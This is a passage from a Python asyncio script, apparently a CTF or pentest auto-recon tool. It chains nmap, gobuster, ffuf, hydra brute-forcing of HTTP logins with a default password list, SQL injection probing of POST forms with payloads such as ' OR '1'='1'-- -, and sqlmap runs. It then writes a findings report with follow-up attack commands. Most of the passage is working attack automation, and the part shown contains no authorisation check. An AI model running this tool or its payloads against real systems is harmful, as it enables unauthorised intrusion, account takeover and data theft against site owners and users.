                    b"admin\npassword\n123456\n" if passlist == "-" else b""
                )
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdin=asyncio.subprocess.PIPE,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.STDOUT,
                )
                out, _ = await proc.communicate(data)
                text = out.decode(errors="ignore")
                done("hydra")
            else:
                rc, out = await run_cmd(cmd, tool="hydra", use_sem="hydra")
                text = (
                    out.decode(errors="ignore")
                    if isinstance(out, (bytes, bytearray))
                    else str(out)
                )
            for line in text.splitlines():
                if "login:" in line and "password:" in line:
                    STATE["findings"]["creds"].append(
                        {"service": f"http:{scheme}:{port}", "line": line.strip()}
                    )
                    important(f"HYDRA HIT ({scheme}:{port}): {line.strip()}")


# ---- SQLi on POST forms ----
async def stage_sqli_post():
    async def post(url, data):
        plan("curl", 1)
        rc, out = await run_cmd(
            [
                "curl",
                "-k",
                "-sS",
                "-m",
                str(STATE["timeout"]),
                "-X",
                "POST",
                "-d",
                data,
                url,
            ],
            tool="curl",
        )
        return rc, (
            out.decode(errors="ignore")
            if isinstance(out, (bytes, bytearray))
            else str(out)
        )

    for h in STATE["http"]:
        base = f"{h['scheme']}://{STATE['target']}:{h['port']}"
        for form in STATE["forms"].get(h["port"], []):
            if form.get("basic") or "post-form" not in form["module"]:
                continue
            m = re.search(r"(^|&)([^=&]+)=\^USER\^\b", form["fields"])
            if not m:
                continue
            ufield = m.group(2)
            _, b0 = await post(
                base + form["path"],
                form["fields"].replace("^USER^", "aaa").replace("^PASS^", "bbb"),
            )
            l0, s0 = body_sig(b0)
            _, be = await post(
                base + form["path"],
                form["fields"].replace("^USER^", "aaa'").replace("^PASS^", "bbb"),
            )
            if any(sig in (be or "").lower() for sig in SQLI_ERROR_SIGNS):
                STATE["findings"]["sqli"].append(
                    {
                        "url": base + form["path"],
                        "param": f"POST:{ufield}",
                        "type": "error",
                        "payload": "'",
                    }
                )
                important(f"SQLi(error) → POST {base+form['path']} [{ufield}]")
                continue
            truep, falsep = "' OR '1'='1'-- -", "' OR '1'='2'-- -"
            _, b1 = await post(
                base + form["path"],
                form["fields"]
                .replace("^USER^", "aaa" + truep)
                .replace("^PASS^", "bbb"),
            )
            _, b2 = await post(
                base + form["path"],
                form["fields"]
                .replace("^USER^", "aaa" + falsep)
                .replace("^PASS^", "bbb"),
            )
            l1, s1 = body_sig(b1)
            l2, s2 = body_sig(b2)
            if abs(l1 - l0) < 20 and abs(l2 - l0) > 50:
                STATE["findings"]["sqli"].append(
                    {
                        "url": base + form["path"],
                        "param": f"POST:{ufield}",
                        "type": "boolean",
                        "payload": truep,
                    }
                )
                important(f"SQLi(boolean) → POST {base+form['path']} [{ufield}]")


# ---- sqlmap (on signal or -S) ----
async def stage_sqlmap():
    if not have("sqlmap"):
        return
    if not (STATE["findings"]["sqli"] or STATE["sqlmap"]):
        return
    order = {"error": 0, "boolean": 1}
    candidates = sorted(
        STATE["findings"]["sqli"], key=lambda x: order.get(x["type"], 9)
    )
    if not candidates:
        return
    hit = candidates[0]
    url = hit["url"].replace("<inj>", "1")
    cmd = [
        "sqlmap",
        "-u",
        url,
        "--batch",
        "--smart",
        "--level",
        "1",
        "--risk",
        "1",
        "--random-agent",
        "--timeout",
        str(STATE["timeout"]),
    ]
    plan("sqlmap", 1)
    rc, out = await run_cmd(
        cmd, tool="sqlmap", use_sem="sqlmap", timeout=min(STATE["timeout"] * 2, 300)
    )
    text = (
        out.decode(errors="ignore") if isinstance(out, (bytes, bytearray)) else str(out)
    )
    fw("\n[sqlmap micro-pass]")
    fw("  " + " ".join(cmd))
    if "parameter" in text.lower() and "is vulnerable" in text.lower():
        fw("  result: vulnerable parameter detected (see console output)")
        important("sqlmap: vulnerable parameter detected")
    else:
        fw("  result: no immediate exploitation confirmed (review console output)")


# ===== Reporting =====
def write_summary_and_next():
    fw("\n[summary]")
    if STATE["ports"]:
        fw(
            "  Open ports: "
            + ", ".join(f"{p['port']}/{p['service']}" for p in STATE["ports"])
        )
    if STATE["findings"]["creds"]:
        fw(
            "  Creds: "
            + "; ".join(
                f"{c['service']} -> {c['line']}" for c in STATE["findings"]["creds"]
            )
        )
    if STATE["findings"]["lfi"]:
        fw("  LFI: " + "; ".join(f"{e['url']}" for e in STATE["findings"]["lfi"][:5]))
    if STATE["findings"]["rce"]:
        fw("  RCE: " + "; ".join(f"{e['url']}" for e in STATE["findings"]["rce"][:5]))
    if STATE["findings"]["sqli"]:
        fw(
            "  SQLi: "
            + "; ".join(
                f"{e['type']} at {e['url']}" for e in STATE["findings"]["sqli"][:5]
            )
        )

    fw("\n[next steps]")
    if STATE["findings"]["sqli"]:
        e = STATE["findings"]["sqli"][0]
        u = e["url"].replace("<inj>", "1")
        fw(f"  - sqlmap confirm: sqlmap -u '{u}' --batch --smart --random-agent")
    if STATE["findings"]["lfi"]:
        e = STATE["findings"]["lfi"][0]
        fw(f"  - confirm LFI: curl -k '{e['url']}' | head")
    if STATE["findings"]["creds"]:
        for c in STATE["findings"]["creds"][:3]:
            fw(f"  - verify creds: {c['line']}")


def write_footer():
    fw(f"\nFinished: {now_utc()}  (elapsed {int(time.time()-START_TS)}s)")


# ===== Main =====
def parse_args():
    p = argparse.ArgumentParser(add_help=False)
    p.add_argument("ip")
    p.add_argument("-t", type=int, default=DEFAULT_THREADS)
    p.add_argument("-T", type=int, default=DEFAULT_TIMEOUT)
    p.add_argument("-D", action="store_true")
    p.add_argument("-S", action="store_true")
    p.add_argument("-R", action="store_true")
    p.add_argument("-tg", type=int, default=DEFAULT_GOBUSTER_T)
    p.add_argument("-th", type=int, default=DEFAULT_HYDRA_T)
    p.add_argument("-G", type=int, default=DEFAULT_GSEM)
    p.add_argument("-H", type=int, default=DEFAULT_HSEM)
    p.add_argument("-Wg", type=str, default=None)
    p.add_argument("-h", "--help", action="help", default=argparse.SUPPRESS)
    return p.parse_args()


async def status_task_main():
    try:
        await status_loop()
    except asyncio.CancelledError:
        pass


async def main():
    args = parse_args()
    STATE.update(
        {
            "target": args.ip,
            "threads": args.t,
            "timeout": args.T,
            "sqlmap": args.S,
            "rockyou": args.R,
            "deeper": args.D,
            "tg": args.tg,
            "th": args.th,
            "gsem": max(1, args.G),
            "hsem": max(1, args.H),
            "gobuster_wl": args.Wg,
        }
    )

    ensure_findings(STATE["target"])
    banner()

    SEM.update(
        {
            "global": asyncio.Semaphore(STATE["threads"]),
            "nmap": asyncio.Semaphore(min(3, max(1, STATE["threads"] // 2))),
            "gobuster": asyncio.Semaphore(STATE["gsem"]),
            "curl": asyncio.Semaphore(min(6, max(1, STATE["threads"] // 2))),
            "ffuf": asyncio.Semaphore(min(4, max(1, STATE["threads"] // 2))),
            "hydra": asyncio.Semaphore(STATE["hsem"]),
            "sqlmap": asyncio.Semaphore(1),
        }
    )

    status_task = asyncio.create_task(status_task_main())

    # IMPORTANT: complete initial nmap before NSE/web
    await stage_nmap()
    await asyncio.gather(
        stage_nse(),
        stage_gobuster(),
    )
    await asyncio.gather(
        stage_ffuf(),
        stage_curl_and_signals(),
        stage_forms_and_hydra_prep(),
    )
    await asyncio.gather(
        stage_sqli_post(),
        stage_hydra(),
    )
    await stage_sqlmap()

    write_summary_and_next()
    write_footer()

    status_task.cancel()
    _status_clear()
    print(f"Done. Findings → {FINDINGS_PATH}")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        _status_clear()
        print("[!] Interrupted by user")
